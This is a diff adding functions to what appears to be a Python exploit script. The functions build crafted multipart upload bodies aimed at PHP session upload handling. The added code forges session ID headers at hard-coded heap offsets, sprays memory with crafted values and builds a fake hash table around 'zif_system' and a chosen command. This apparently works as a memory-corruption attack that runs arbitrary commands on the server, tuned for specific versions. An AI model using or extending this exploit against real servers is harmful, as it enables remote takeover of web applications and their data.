@@ -180,3 +180,112 @@ def build_b2(address, zif_system, command):
 
     out += b"--" + BOUNDARY + b"--\r\n"
     return bytes(out)
+
+
+def build_a1_83():
+    out = bytearray()
+    out += part(b"PHPSESSID", b"S" * 84 + b"\0")
+
+    for index in range(860):
+        name = (
+            ("files[R%05d" % index).encode()
+            + b"K" * 90
+            + b"]"
+            + b"[a]" * 62
+        )
+        out += b"--" + BOUNDARY + b'\r\nContent-Disposition: form-data; name="'
+        out += name + b'"'
+        if index == 0:
+            out += b'; filename="A"\r\nContent-Type: ' + b"C" * 103
+        elif index == 1:
+            out += b'; filename="A"\r\nContent-Type: ' + b"C" * 231
+        else:
+            out += b'; filename=""\r\nContent-Type: application/octet-stream'
+        out += b"\r\n\r\n"
+
+    for index in range(34):
+        name = ("f%04d" % index).encode().ljust(103, b"x")
+        out += part(name, b"v" * 8)
+    for index in range(76):
+        out += part(("b%04d" % index).encode(), b"B" * 8000)
+    for index in range(20):
+        out += part(("u%02d" % index).encode(), b"U" * 4000)
+
+    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * 4000)
+    for index in range(15):
+        name = ("f%04d" % index).encode().ljust(103, b"x")
+        out += part(name, b"V" * 85)
+    out += part(b"u", b"U" * 85)
+    out += part(b"v", b"V" * 4000)
+    out += part(b"w", b"W" * 35)
+    out += b"--" + BOUNDARY + b"--\r\n"
+    return bytes(out)
+
+
+def _build_forged_b1(id_chunk_offset, page_specs):
+    def forged_value(pages, index):
+        length = pages * 4096 - 25
+        value = bytearray(b"A" * length)
+        header = id_chunk_offset - 0x1018
+        if header < 0 or header + 0x20 > length:
+            raise ValueError("forged session ID header falls outside its field")
+        struct.pack_into("<IIQQ", value, header, 0, 0x16, 0, 0xC8000)
+        value[header + 0x18:header + 0x20] = (
+            b"/" + ("%02d" % (index % 100)).encode() + b"BBBBB"
+        )
+        return bytes(value)
+
+    out = bytearray()
+    out += part(b"PHPSESSID", b"a")
+    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
+    for index, pages in enumerate(page_specs):
+        name = (b"f%04d" % index).ljust(120, b"f")
+        out += part(name, forged_value(pages, index))
+    for index in range(900):
+        name = (b"x%05d" % index) + b"[a]" * 12
+        out += part(name, b"v")
+    out += b"--" + BOUNDARY + b"--\r\n"
+    return bytes(out)
+
+
+def build_b1_83():
+    return _build_forged_b1(0xE2968, [511] * 14 + [400, 511])
+
+
+def build_a1_85():
+    body = build_a1()
+    close = b"--" + BOUNDARY + b"--\r\n"
+    extra = part(b"v", b"V" * 150)
+    body = body[:-len(close)] + extra + close
+
+    anchor = (
+        b"--"
+        + BOUNDARY
+        + b'\r\nContent-Disposition: form-data; name="b0035"\r\n\r\n'
+    )
+    if body.count(anchor) != 1:
+        raise RuntimeError("Apache85 A1 anchor changed")
+    return body.replace(anchor, part(b"w", b"W" * 35) + anchor, 1)
+
+
+def build_b1_85():
+    pages = [511] * 7 + [400, 400] + [511] * 8
+    return _build_forged_b1(0xE8080, pages)
+
+
+def build_b2_85(address, zif_system, command):
+    spray = spray_value(address)
+    table = build_hash_table(address, zif_system, command)
+    out = bytearray()
+
+    for index in range(500):
+        out += part(spray_name(b"s", index), spray)
+    out += part(b"ht", table)
+    out += part(b"PHPSESSID", b"a" * 32)
+    out += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
+    for index in range(495):
+        value = b"\0" * 384 if index == 494 else spray
+        out += part(spray_name(b"t", index), value)
+
+    out += b"--" + BOUNDARY + b"--\r\n"
+    return bytes(out)
